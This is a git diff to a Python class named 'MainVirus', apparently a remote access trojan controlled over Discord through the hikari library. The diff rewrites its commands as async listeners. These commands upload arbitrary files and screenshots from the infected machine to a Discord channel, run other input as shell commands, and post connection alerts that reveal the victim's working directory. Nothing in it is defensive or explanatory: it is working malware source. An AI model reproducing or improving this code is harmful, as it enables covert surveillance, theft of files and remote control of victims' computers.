@@ -73,28 +73,34 @@ class MainVirus:  # Making a class to wrap code cause organisation
         else:
             return "[no_output]"  # Returns no output tag
 
-    def cat(self, syntax, event):  # Cat command - Returns the selected file
-            self.bot.rest.create_message(self.channel_id, f"Sending File: {syntax[0]}")  # Sends information message - sends file name
-            fileLoc = os.path.join(self.cwd, syntax[0])  # Sets the file loc
-            self.bot.rest.create_message(self.channel_id, hikari.File(fileLoc))  # Sends File
+    def cat(self, syntax):  # Cat command - Returns the selected file
+        @self.bot.listen(hikari.GuildMessageCreateEvent)  # Message Sent Event
+        async def onConfirm(event):  # Creates the event function - runs on event
+            if self.isCommandConfirm(event, "dog"):  # Checks for confirmation
+                await self.bot.rest.create_message(self.channel_id, f"Sending File: {syntax[0]}")  # Sends information message - sends file name
+                fileLoc = os.path.join(self.cwd, syntax[0])  # Sets the file loc
+                await self.bot.rest.create_message(self.channel_id, hikari.File(fileLoc))  # Sends File
 
-    def update(self, syntax, event): # Update command - updates the virus file
-        pass
+    def screen(self, syntax):  # Screen command - Returns a ScreenShot
+        @self.bot.listen(hikari.GuildMessageCreateEvent)  # Message Sent Event
+        async def onConfirm(event):  # Creates the event function - runs on event
+            if self.isCommandConfirm(event, "screenshot"):  # Checks for confirmation
+                try: os.makedirs(os.path.join(os.getcwd(), "screenshot"))  # Attempts to create a screenshots folder
+                except: pass
+                now = datetime.datetime.now()  # Gets the current time
+                fileLoc = os.path.join(os.getcwd(), "screenshot", f"screenshot[{now.year}-{now.month}-{now.day}-{now.hour}-{now.minute}-{now.second}].png")  # Sets the fileLoc
+                await self.bot.rest.create_message(self.channel_id, "Taking Screenshot")  # Screenshot alert
+                screenshot = ImageGrab.grab()  # Takes a screenshot
+                screenshot.save(fileLoc)  # Saves screenshot
+                await self.bot.rest.create_message(self.channel_id, "Sending Screenshot")  # Sending image alert
+                await self.bot.rest.create_message(self.channel_id, hikari.File(fileLoc))  # Sends File
 
-    def screen(self, syntax, event):  # Screen command - Returns a ScreenShot
-            try: os.makedirs(os.path.join(os.getcwd(), "screenshot"))  # Attempts to create a screenshots folder
-            except: pass
-            now = datetime.datetime.now()  # Gets the current time
-            fileLoc = os.path.join(os.getcwd(), "screenshot", f"screenshot[{now.year}-{now.month}-{now.day}-{now.hour}-{now.minute}-{now.second}].png")  # Sets the fileLoc
-            self.bot.rest.create_message(self.channel_id, "Taking Screenshot")  # Screenshot alert
-            screenshot = ImageGrab.grab()  # Takes a screenshot
-            screenshot.save(fileLoc)  # Saves screenshot
-            self.bot.rest.create_message(self.channel_id, "Sending Screenshot")  # Sending image alert
-            self.bot.rest.create_message(self.channel_id, hikari.File(fileLoc))  # Sends File
-
-    def exit(self, syntax, event):  # Exit command - Closes connection
-                self.bot.rest.create_message(self.channel_id, "Closing Connection")  # Sends "Closing Connection" message
-                self.bot.rest.create_message(  # Creates "Connection Lost" Alert
+    def exit(self, syntax):  # Exit command - Closes connection
+        @self.bot.listen(hikari.GuildMessageCreateEvent)  # Message sent event
+        async def onConfirm(event):  # Creates the event function - runs at event
+            if self.isCommandConfirm(event, "exit"):  # Checks for confirmation
+                await self.bot.rest.create_message(self.channel_id, "Closing Connection")  # Sends "Closing Connection" message
+                await self.bot.rest.create_message(  # Creates "Connection Lost" Alert
                     985853985577635910,
                     f"{'-' * 20}\n"
                     f"@everyone **CONNECTION LOST :(**\n"
@@ -103,7 +109,7 @@ class MainVirus:  # Making a class to wrap code cause organisation
                     f"**CWD: **||{os.getcwd()}||\n"
                     f"{'-' * 20}\n"
                 )
-                self.bot.rest.delete_channel(self.channel_id)  # Deletes the connection channel
+                await self.bot.rest.delete_channel(self.channel_id)  # Deletes the connection channel
                 sys.exit()  # Program stops
 
     def isCommandConfirm(self, event, keyword):  # Checks for confirmation
@@ -128,7 +134,7 @@ class MainVirus:  # Making a class to wrap code cause organisation
         if str(inpit).__contains__("<"):  # Checks if input is a command
             fun = inpit.strip("<")  # Removes the command initiator
             parsed = Parser(fun).run()  # Parses the input into data
-            self.funList[parsed[0]](parsed[1, event])  # Runs the command specified
+            self.funList[parsed[0]](parsed[1])  # Runs the command specified
             return "[running command]"  # Returns message - "[running command]"
         else:
             return out(inpit)  # Runs shell command and returns output
